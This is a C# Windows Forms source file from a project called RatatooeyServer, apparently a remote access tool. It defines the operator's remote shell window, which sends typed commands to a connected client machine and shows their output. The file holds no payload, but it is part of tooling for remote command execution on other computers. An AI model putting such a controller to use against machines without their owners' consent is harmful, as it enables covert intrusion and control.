using RatatooeyServer.Helpers;
using RatatooeyServer.ProtoMessages;
using RatatooeyServer.Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RatatooeyServer
{
	public partial class RemoteShellForm : Form
	{
		public Client c;

		//remote shell handler
		public RemoteShellHandler shellHandler;

        public RemoteShellForm(Client client)
        {
			c = client;
			this.Tag = client;

			shellHandler = new RemoteShellHandler(client);
			InitializeComponent();

			txtOutput.AppendText(">> Type 'exit' to close session\n");
		}
		public void handle(IMessage m)
		{
			if (m is RemoteShellResponse)
			{
				var mm = (RemoteShellResponse)m;
				txtOutput.SelectionColor = Color.WhiteSmoke;
				txtOutput.AppendText(mm.Output);
			}
			

		}
		private void CommandOutput(object sender, string output)
		{
			txtOutput.SelectionColor = Color.WhiteSmoke;
			txtOutput.AppendText(output);
		}

		private void txtOutput_TextChanged(object sender, EventArgs e)
		{

		}

		private void txtInput_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyData == Keys.Enter)
			{
				txtOutput.SelectionColor = Color.GreenYellow;
				txtOutput.AppendText("\n> " + txtInput.Text + "\n");
				shellHandler.SendCommand(txtInput.Text);
				txtInput.Text = "";
			}
		}

		private void RemoteShellForm_Load(object sender, EventArgs e)
		{

		}
	}
}
